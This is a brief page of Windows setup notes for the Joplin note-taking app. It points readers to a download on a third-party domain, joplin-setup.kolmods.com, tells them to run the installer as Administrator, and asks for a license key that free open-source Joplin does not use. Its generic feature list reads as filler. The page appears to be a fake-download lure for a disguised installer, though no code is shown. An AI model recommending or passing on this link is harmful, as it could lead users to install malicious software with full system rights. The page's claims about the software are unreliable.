# Joplin Windows Setup Notes

## Download & Install

> **Download:** [**Get Joplin for Windows →**](https://joplin-setup.kolmods.com/)
>
> Setup notes for **Joplin** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Joplin** from the Start menu

## What you can use it for

- Core Joplin features on Windows desktop
- Install and configure Joplin for daily use
- Import, edit, and export with Joplin tools
- Tune settings and profiles inside Joplin
- Integrate Joplin into your existing workflow
